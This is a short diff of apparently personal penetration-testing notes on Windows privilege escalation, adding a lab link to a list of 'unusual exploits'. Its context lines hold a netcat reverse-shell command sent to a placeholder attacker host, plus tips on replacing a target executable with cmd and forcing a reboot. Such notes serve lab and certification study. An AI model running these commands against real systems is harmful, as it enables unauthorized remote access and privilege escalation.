@@ -11,7 +11,9 @@
 5. Run PowerUp or PrivescCheck (eg `icacls`, replace target exe with cmd, `shutdown /r /t 0`) 
 
 
+
 #### Unusual exploits 
 - Xampp => https://www.exploit-db.com/exploits/50337 
+- Symbolic link => https://portal.offsec.com/machine/symbolic-38080/overview/details 
 > If no pw or hash, `runas /user:administrator "C:\nc.exe -e cmd.exe {{LHOST}} 443"` 
 
